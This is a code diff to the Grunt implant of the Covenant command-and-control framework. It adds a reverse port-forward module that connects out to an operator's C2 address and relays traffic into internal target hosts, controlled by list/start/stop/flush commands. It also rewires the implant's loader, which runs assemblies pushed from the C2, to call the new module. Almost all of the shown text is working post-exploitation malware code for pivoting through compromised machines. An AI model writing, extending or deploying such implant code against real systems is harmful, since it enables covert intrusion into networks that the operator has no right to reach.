@@ -12,11 +12,564 @@ using System.Security.Principal;
 using System.Security.AccessControl;
 using System.Security.Cryptography;
 using System.Text.RegularExpressions;
+using Microsoft.CSharp;
+using System.Net.Sockets;
+using System.Security.Policy;
+
 
 namespace GruntExecutor
 {
     class Grunt
     {
+        public static class Portfwd
+
+        //Reverse Port Forward by Thiago Mayllart
+
+        {
+
+            public static Dictionary<string, bool> states = new Dictionary<string, bool>();
+            public static Dictionary<string, List<Socket>> target_sockets = new Dictionary<string, List<Socket>>();
+            public static Dictionary<string, List<Socket>> c2_sockets = new Dictionary<string, List<Socket>>();
+            public static Dictionary<string, Thread> portfwds = new Dictionary<string, Thread>();
+            public static Dictionary<string, List<string>> info_list = new Dictionary<string, List<string>>();
+            public static Dictionary<string, byte[]> Data = new Dictionary<string, byte[]>();
+
+            public class Byte_Data
+            {
+                public byte[] data_to_send;
+                public int size_of_data;
+                public Byte_Data(byte[] data, int size)
+                {
+                    this.data_to_send = data;
+                    this.size_of_data = size;
+                }
+            }
+
+            public class handleClient
+            {
+                Socket sockC2;
+                Socket sockTarget;
+                string bind_port;
+
+                public List<byte[]> bytesFromC2 = new List<byte[]>();
+                bool bytesFromC2_lock = false;
+                public List<Byte_Data> bytesFromTarget = new List<Byte_Data>();
+                bool bytesFromTarget_lock = false;
+                public List<byte[]> bytesToC2 = new List<byte[]>();
+                bool bytesToC2_lock = false;
+                public List<byte[]> bytesToTarget = new List<byte[]>();
+                bool bytesToTarget_lock = false;
+                IPEndPoint remotetarget;
+
+                bool targetslock = false;
+
+                public void startClient(Socket sockC2, Socket sockTarget, string bind_port, IPEndPoint remote_target)
+                {
+                    this.sockC2 = sockC2;
+                    this.sockTarget = sockTarget;
+                    this.bind_port = bind_port;
+                    this.remotetarget = remote_target;
+                    Thread ctThread = new Thread(() => doChat(bind_port, sockC2, sockTarget, remote_target));
+                    ctThread.Start();
+                }
+
+
+
+                public void asyncRead(Socket socket, int id, string bind_port)
+                {
+                    String from = "";
+                    if (id == 0)
+                    {
+                        from = "C2";
+                    }
+                    else
+                    {
+                        from = "target";
+                    }
+                    var data = new byte[8192];
+                    while (states[bind_port] == true)
+                    {
+                        try
+                        {
+                            if (id == 0)
+                            {
+                                if (bytesFromC2.Count == 10)
+                                {
+                                    System.Threading.Thread.Sleep(5000);
+                                }
+                                else
+                                {
+                                    data = new byte[4];
+                                    int i = socket.Receive(data, 4, SocketFlags.None);
+                                    int length = BitConverter.ToInt32(data, 0);
+                                    byte[] body = new byte[length];
+                                    int offset = 0;
+                                    while (length > 0)
+                                    {
+                                        int ret = socket.Receive(body, offset, length, SocketFlags.None);
+                                        if (ret > 0)
+                                        {
+                                            offset += ret;
+                                            length -= ret;
+                                        }
+                                        else
+                                        {
+                                            break;
+                                        }
+                                    }
+                                    bytesFromC2.Add(body);
+                                }
+                            }
+                            if (id == 1)
+                            {
+                                if (bytesFromTarget.Count == 10)
+                                {
+                                    System.Threading.Thread.Sleep(1000);
+                                }
+                                else
+                                {
+                                    data = new byte[8192];
+                                    int size_data = socket.Receive(data);
+                                    bytesFromTarget.Add(new Byte_Data(data.Take(size_data).ToArray(), size_data));
+
+
+                                }
+                            }
+                        }
+                        catch (Exception e)
+                        {
+                            break;
+                        }
+                    }
+                    try
+                    {
+                        socket.Shutdown(SocketShutdown.Both);
+                        socket.Close();
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e.Message + e.StackTrace);
+                    }
+                }
+
+                public void asyncWrite(Socket socket, int id, string bind_port)
+                {
+                    while (states[bind_port] == true)
+                    {
+                        try
+                        {
+                            if (id == 0)
+                            {
+                                if (bytesFromC2.ToList().Any())
+                                {
+
+                                    socket.Send(bytesFromC2[0]);
+                                    bytesFromC2.RemoveAt(0);
+                                }
+                                else
+                                {
+                                    System.Threading.Thread.Sleep(1000);
+                                }
+                            }
+                            if (id == 1)
+                            {
+                                if (bytesFromTarget.ToList().Any())
+                                {
+                                    socket.Send(BitConverter.GetBytes(bytesFromTarget[0].size_of_data));
+                                    socket.Send(bytesFromTarget[0].data_to_send);
+                                    bytesFromTarget.RemoveAt(0);
+
+                                }
+                                else
+                                {
+                                    System.Threading.Thread.Sleep(1000);
+                                }
+                            }
+                        }
+                        catch (Exception e)
+                        {
+                            break;
+                        }
+                    }
+                    try
+                    {
+                        socket.Shutdown(SocketShutdown.Both);
+                        socket.Close();
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e.Message + e.StackTrace);
+                    }
+                }
+
+                public void doChat(string bind_port, Socket sock_c2, Socket sock_target, IPEndPoint remote_target)
+                {
+                    Thread keep_reading_from_C2 = new Thread(() => asyncRead(sock_c2, 0, bind_port));
+                    Thread keep_writing_to_Target = new Thread(() => asyncWrite(sock_target, 0, bind_port));
+                    Thread keep_reading_from_Target = new Thread(() => asyncRead(sock_target, 1, bind_port));
+                    Thread keep_writing_to_C2 = new Thread(() => asyncWrite(sock_c2, 1, bind_port));
+                    try
+                    {
+                        keep_reading_from_C2.Start();
+                        System.Threading.Thread.Sleep(1000);
+                        keep_writing_to_Target.Start();
+                        System.Threading.Thread.Sleep(1000);
+                        keep_reading_from_Target.Start();
+                        System.Threading.Thread.Sleep(1000);
+                        keep_writing_to_C2.Start();
+                        while ((true))
+                        {
+                            try
+                            {
+                                int result1 = sock_c2.Available;
+                            }
+                            catch (Exception ef)
+                            {
+                                keep_reading_from_C2.Abort();
+                                keep_reading_from_C2 = null;
+                                keep_writing_to_Target.Abort();
+                                keep_writing_to_Target = null;
+                                keep_reading_from_Target.Abort();
+                                keep_reading_from_Target = null;
+                                keep_writing_to_C2.Abort();
+                                keep_writing_to_C2 = null;
+                                sock_target.Shutdown(SocketShutdown.Both);
+                                sock_target.Close();
+                                sock_c2.Shutdown(SocketShutdown.Both);
+                                sock_c2.Close();
+                                break;
+                            }
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("Threads Bug");
+
+                    }
+                }
+            }
+
+
+            public static void handleData(string c2_ip, string bind_port, string target_port, string target_ip, string rand_port)
+            {
+                try
+                {
+                    bool shouldcontinue = true;
+                    states[bind_port] = true;
+                    Socket socketC2 = null;
+                    Socket socketTarget = null;
+
+                    while (states[bind_port])
+                    {
+                        try
+                        {
+                            var c2_ip_p = IPAddress.Parse(c2_ip);
+                            IPEndPoint remoteEPC2 = new IPEndPoint(c2_ip_p, Convert.ToInt32(rand_port));
+
+                            // Create a TCP/IP  socket.  
+                            socketC2 = new Socket(c2_ip_p.AddressFamily,
+                                SocketType.Stream, ProtocolType.Tcp);
+                            socketC2.Connect(remoteEPC2);
+                            String code_to_start = "testingcode";
+                            socketC2.Send(Encoding.UTF8.GetBytes(code_to_start));
+                            byte[] data_aux = new byte[256];
+                            byte[] data = new byte[256];
+                            socketC2.Receive(data);
+                            c2_sockets[bind_port].Add(socketC2);
+                            var target_ip_p = IPAddress.Parse(target_ip);
+                            IPEndPoint remoteTarget = new IPEndPoint(target_ip_p, Convert.ToInt32(target_port));
+
+                            socketTarget = new Socket(target_ip_p.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                            socketTarget.Connect(remoteTarget);
+                            target_sockets[bind_port].Add(socketTarget);
+                            handleClient client = new handleClient();
+                            client.startClient(socketC2, socketTarget, bind_port, remoteTarget);
+                        }
+                        catch (Exception ef)
+                        {
+                            Console.WriteLine(ef.Message + ef.StackTrace);
+                        }
+                    }
+                    socketC2.Shutdown(SocketShutdown.Both);
+                    socketC2.Close();
+                    socketTarget.Shutdown(SocketShutdown.Both);
+                    socketTarget.Close();
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                }
+
+
+            }
+
+            public static string AddPortForward(string ip, string bind_port, string target_port, string target_ip, string rand_port)
+            {
+                List<Socket> targets = new List<Socket>();
+                List<Socket> c2s = new List<Socket>();
+                c2_sockets[bind_port] = c2s;
+                target_sockets[bind_port] = targets;
+                Thread ctThread = new Thread(() => handleData(ip, bind_port, target_port, target_ip, rand_port));
+                ctThread.Start();
+                portfwds[bind_port] = ctThread;
+                info_list[bind_port] = new List<string>(new string[] { "[+]", bind_port, target_ip, target_port });
+                return ShowReversePortForwwrds();
+            }
+
+            public static string DelPortForward(string data, string bind_port)
+            {
+                try
+                {
+                    states[bind_port] = false;
+                    info_list.Remove(bind_port);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                }
+                foreach (Socket sc in c2_sockets[bind_port])
+                {
+                    try
+                    {
+                        sc.Shutdown(SocketShutdown.Both);
+                        sc.Close();
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e.Message);
+                    }
+                }
+                foreach (Socket sc2 in target_sockets[bind_port])
+                {
+                    try
+                    {
+                        sc2.Shutdown(SocketShutdown.Both);
+                        sc2.Close();
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e.Message);
+                    }
+                }
+                try
+                {
+                    portfwds[bind_port].Abort();
+                }
+                catch (Exception e)
+                {
+
+                }
+                return ShowReversePortForwwrds();
+            }
+
+            public static string FlushPortForward()
+            {
+                var keys = new List<string>(states.Keys);
+                foreach (string key in keys)
+                {
+                    states[key] = false;
+                }
+
+                var keys2 = new List<string>(states.Keys);
+                foreach (string key in keys2)
+                {
+                    try
+                    {
+                        portfwds[key].Abort();
+                    }
+                    catch (Exception e)
+                    {
+
+                    }
+                }
+
+                var keys3 = new List<string>(info_list.Keys);
+                foreach (string key in keys3)
+                {
+                    info_list.Remove(key);
+                }
+
+                var keys4 = new List<string>(c2_sockets.Keys);
+                foreach (string key in keys4)
+                {
+                    try
+                    {
+                        foreach (Socket sc in c2_sockets[key])
+                        {
+                            sc.Shutdown(SocketShutdown.Both);
+                            sc.Close();
+                        }
+                    }
+                    catch (Exception e)
+                    {
+
+                    }
+                }
+
+                var keys5 = new List<string>(target_sockets.Keys);
+                foreach (string key in keys5)
+                {
+                    try
+                    {
+                        foreach (Socket sc2 in target_sockets[key])
+                        {
+                            sc2.Shutdown(SocketShutdown.Both);
+                            sc2.Close();
+                        }
+                    }
+                    catch (Exception e)
+                    {
+
+                    }
+                }
+                return "Flushed Reverse Port Forward";
+            }
+
+            public static string ShowReversePortForwwrds()
+            {
+                List<String> results = new List<String>();
+                var keys = new List<string>(info_list.Keys);
+                foreach (string key in keys)
+                {
+                    List<String> ls;
+                    ls = info_list[key];
+                    string s = string.Join(" ", ls.ToArray());
+                    results.Add(s);
+                }
+                string final_result = string.Join("\r\n", results.ToArray());
+                return final_result;
+            }
+
+
+            public static bool DummyMethod()
+            {
+                return true;
+            }
+
+            public static String dealwithit(String Command)
+            {
+
+                string output = "";
+                try
+                {
+
+                    TextWriter realStdOut = Console.Out;
+                    TextWriter realStdErr = Console.Error;
+                    TextWriter stdOutWriter = new StringWriter();
+                    TextWriter stdErrWriter = new StringWriter();
+                    Console.SetOut(stdOutWriter);
+                    Console.SetError(stdErrWriter);
+
+                    if (Command.Contains(' '))
+                    {
+                        int index = Command.IndexOf(' ');
+                        string comm = Command.Substring(0, index);
+                        string func = Command.Substring(index + 1);
+                        string[] commands = func.Split(' ');
+                        string bind_port;
+                        string ip;
+                        string target_port;
+                        string target_ip;
+                        string random_port;
+                        switch (comm)
+                        {
+                            case "list":
+                                output += ShowReversePortForwwrds();
+                                break;
+                            case "start":
+                                bind_port = commands[1];
+                                ip = commands[0];
+                                target_port = commands[3];
+                                target_ip = commands[2];
+                                random_port = commands[4];
+                                output += AddPortForward(ip, bind_port, target_port, target_ip, random_port);
+                                break;
+                            case "stop":
+                                bind_port = commands[0];
+                                output += DelPortForward(func, bind_port);
+                                break;
+                            case "flush":
+                                output += FlushPortForward();
+                                break;
+                            case "help":
+                                output += "[+] Usage: \r\n";
+                                output += "[+] list\r\n";
+                                output += "[+] Returns a list of current reverse port forwards.\r\n\r\n";
+
+
+
+                                output += "[+] start\r\n";
+                                output += "[+] Starts a new reverse port forward.\r\n";
+                                output += "[+] start [bind port] [forward host] [forward port] [ip_to_allow_connections]\r\n";
+
+                                output += "[+] Stop\r\n";
+                                output += "[+] Stops an existing reverse port forward.\r\n";
+                                output += "[+] stop [bind port]\r\n";
+
+                                output += "[+] flush\r\n";
+                                output += "[+] Flush all reverse port forwards on an Agent.\r\n";
+                                break;
+                            default:
+                                output += "[+] Usage:\r\n ";
+                                output += "[+] list \r\n";
+                                output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";
+
+
+
+                                output += "[+] start \r\n";
+                                output += "[+] Starts a new reverse port forward.\r\n";
+                                output += "[+] start [bind port] [forward host] [forward port]\r\n\r\n";
+
+                                output += "[+] Stop\r\n";
+                                output += "[+] Stops an existing reverse port forward.\r\n";
+                                output += "[+] stop [bind port]\r\n\r\n";
+
+                                output += "[+] flush";
+                                output += "[+] Flush all reverse port forwards on an Agent.\r\n";
+                                break;
+
+
+                        }
+                    }
+                    else
+                    {
+                        output += "[+] Usage: \r\n";
+                        output += "[+] list \r\n";
+                        output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";
+
+
+
+                        output += "[+] start \r\n";
+                        output += "[+] Starts a new reverse port forward. \r\n";
+                        output += "[+] start [bind port] [forward host] [forward port] \r\n\r\n";
+
+                        output += "[+] Stop \r\n";
+                        output += "[+] Stops an existing reverse port forward. \r\n";
+                        output += "[+] stop [bind port] \r\n\r\n";
+
+                        output += "[+] flush \r\n";
+                        output += "[+] Flush all reverse port forwards on an Agent. \r\n";
+                    }
+
+                    Console.Out.Flush();
+                    Console.Error.Flush();
+                    Console.SetOut(realStdOut);
+                    Console.SetError(realStdErr);
+
+                    output += stdOutWriter.ToString();
+                    output += stdErrWriter.ToString();
+
+
+                    return output;
+                }
+                catch (Exception e)
+                {
+                    output += e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; Console.WriteLine(e.Message);
+                    return output;
+                }
+            }
+        }
+
         public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)
         {
             try
@@ -25,12 +578,12 @@ namespace GruntExecutor
                 int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                 int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                 DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
-                List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+				List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                 List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-                List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
-                string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
-                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
-                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
+				List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
+				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
+				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
+				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                 bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                 bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
 
@@ -147,7 +700,7 @@ namespace GruntExecutor
                                 messenger.WriteTaskingMessage();
                                 return;
                             }
-                            else if (message.Type == GruntTaskingType.Tasks)
+                            else if(message.Type == GruntTaskingType.Tasks)
                             {
                                 if (!Tasks.Where(T => T.Value.IsAlive).Any()) { output += "No active tasks!"; }
                                 else
@@ -158,7 +711,7 @@ namespace GruntExecutor
                                 }
                                 messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                             }
-                            else if (message.Type == GruntTaskingType.TaskKill)
+                            else if(message.Type == GruntTaskingType.TaskKill)
                             {
                                 var matched = Tasks.Where(T => T.Value.IsAlive && T.Key.ToLower() == message.Message.ToLower());
                                 if (!matched.Any())
@@ -244,83 +797,96 @@ namespace GruntExecutor
                     string[] pieces = message.Message.Split(',');
                     if (pieces.Length > 0)
                     {
-                        object[] parameters = null;
-                        if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
+                        string[] parameters = null;
+                        if (pieces.Length > 1) { parameters = new string[pieces.Length - 1]; }
                         for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
                         byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                         byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                         Assembly gruntTask = Assembly.Load(decompressedBytes);
                         PropertyInfo streamProp = gruntTask.GetType("Task").GetProperty("OutputStream");
                         string results = "";
+                        object objTask = new object();
+                        var myMethodExists = gruntTask.GetType("Task").GetMethod("DummyPortFwd");
+
                         if (streamProp == null)
                         {
                             results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                         }
                         else
                         {
-                            Thread invokeThread = new Thread(() => results = (string) gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
-                            using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
+                            if (myMethodExists != null)
                             {
-                                using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
+                                string params_str = string.Join("", parameters);
+                                results = Portfwd.dealwithit(params_str);
+                                if (results != null) { output += (string)results; }
+                            }
+                            else
+                            {
+                                Thread invokeThread = new Thread(() => results = (string)gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
+                                using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
                                 {
-                                    streamProp.SetValue(null, pipeClient, null);
-                                    DateTime lastTime = DateTime.Now;
-                                    invokeThread.Start();
-                                    using (StreamReader reader = new StreamReader(pipeServer))
+                                    using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
                                     {
-                                        object synclock = new object();
-                                        string currentRead = "";
-                                        Thread readThread = new Thread(() => {
-                                            int count;
-                                            char[] read = new char[MAX_MESSAGE_SIZE];
-                                            while ((count = reader.Read(read, 0, read.Length)) > 0)
+                                        streamProp.SetValue(null, pipeClient, null);
+                                        DateTime lastTime = DateTime.Now;
+                                        invokeThread.Start();
+                                        using (StreamReader reader = new StreamReader(pipeServer))
+                                        {
+                                            object synclock = new object();
+                                            string currentRead = "";
+                                            Thread readThread = new Thread(() =>
                                             {
+                                                int count;
+                                                char[] read = new char[MAX_MESSAGE_SIZE];
+                                                while ((count = reader.Read(read, 0, read.Length)) > 0)
+                                                {
+                                                    lock (synclock)
+                                                    {
+                                                        currentRead += new string(read, 0, count);
+                                                    }
+                                                }
+                                            });
+                                            readThread.Start();
+                                            while (readThread.IsAlive)
+                                            {
+                                                Thread.Sleep(Delay * 1000);
                                                 lock (synclock)
                                                 {
-                                                    currentRead += new string(read, 0, count);
-                                                }
-                                            }
-                                        });
-                                        readThread.Start();
-                                        while (readThread.IsAlive)
-                                        {
-                                            Thread.Sleep(Delay * 1000);
-                                            lock (synclock)
-                                            {
-                                                try
-                                                {
-                                                    if (currentRead.Length >= MAX_MESSAGE_SIZE)
+                                                    try
                                                     {
-                                                        for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
+                                                        if (currentRead.Length >= MAX_MESSAGE_SIZE)
                                                         {
-                                                            string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
-                                                            try
+                                                            for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
                                                             {
-                                                                GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
-                                                                messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                                string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
+                                                                try
+                                                                {
+                                                                    GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, aRead);
+                                                                    messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                                }
+                                                                catch (Exception) { }
                                                             }
-                                                            catch (Exception) {}
+                                                            currentRead = "";
+                                                            lastTime = DateTime.Now;
                                                         }
-                                                        currentRead = "";
-                                                        lastTime = DateTime.Now;
+                                                        else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
+                                                        {
+                                                            GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
+                                                            messenger.QueueTaskingMessage(response.ToJson(), message.Name);
+                                                            currentRead = "";
+                                                            lastTime = DateTime.Now;
+                                                        }
                                                     }
-                                                    else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
-                                                    {
-                                                        GruntTaskingMessageResponse response = new GruntTaskingMessageResponse(GruntTaskingStatus.Progressed, currentRead);
-                                                        messenger.QueueTaskingMessage(response.ToJson(), message.Name);
-                                                        currentRead = "";
-                                                        lastTime = DateTime.Now;
-                                                    }
+                                                    catch (ThreadAbortException) { break; }
+                                                    catch (Exception) { currentRead = ""; }
                                                 }
-                                                catch (ThreadAbortException) { break; }
-                                                catch (Exception) { currentRead = ""; }
                                             }
+                                            output += currentRead;
                                         }
-                                        output += currentRead;
                                     }
                                 }
+                                invokeThread.Join();
                             }
-                            invokeThread.Join();
                         }
                         output += results;
                     }
@@ -810,7 +1376,7 @@ namespace GruntExecutor
                 int readBytes = 0;
                 do
                 {
-                    readBytes = this.Pipe.Read(buffer, 0, Math.Min(len - totalReadBytes, buffer.Length));
+                    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);
                     ms.Write(buffer, 0, readBytes);
                     totalReadBytes += readBytes;
                 } while (totalReadBytes < len);
@@ -1070,12 +1636,12 @@ namespace GruntExecutor
             Tasking
         }
 
-        public string GUID { get; set; } = "";
+		public string GUID { get; set; } = "";
         public GruntEncryptedMessageType Type { get; set; }
         public string Meta { get; set; } = "";
-        public string IV { get; set; } = "";
-        public string EncryptedMessage { get; set; } = "";
-        public string HMAC { get; set; } = "";
+		public string IV { get; set; } = "";
+		public string EncryptedMessage { get; set; } = "";
+		public string HMAC { get; set; } = "";
 
         public bool VerifyHMAC(byte[] Key)
         {
@@ -1235,7 +1801,7 @@ namespace GruntExecutor
             if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
             Match match = new Regex(format).Match(data);
             List<string> matches = new List<string>();
-            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
+			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
             if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
             if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
             if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
